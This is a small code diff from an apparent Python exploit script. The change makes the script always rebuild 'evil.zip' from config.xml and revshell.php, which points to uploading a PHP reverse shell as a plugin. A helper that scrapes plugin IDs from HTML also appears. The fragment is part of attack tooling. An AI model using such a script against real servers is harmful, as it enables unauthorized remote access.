@@ -66,13 +66,10 @@ def createZip():
     else:
         print(colored("\n[!] Missing required files: config.xml and/or revshell.php not found in the current directory!.\n", "red"))
         sys.exit(1)
-
-    if os.path.exists("./evil.zip"):
-        pass
-    else:
-        with ZipFile("./evil.zip", "w") as f:
-            f.write("config.xml")
-            f.write("revshell.php")
+        
+    with ZipFile("./evil.zip", "w") as f:
+        f.write("config.xml")
+        f.write("revshell.php")
 
 def get_pluginID(html):
     plugins_ids = re.findall(r'<tr data-id="(\d+)"', html)
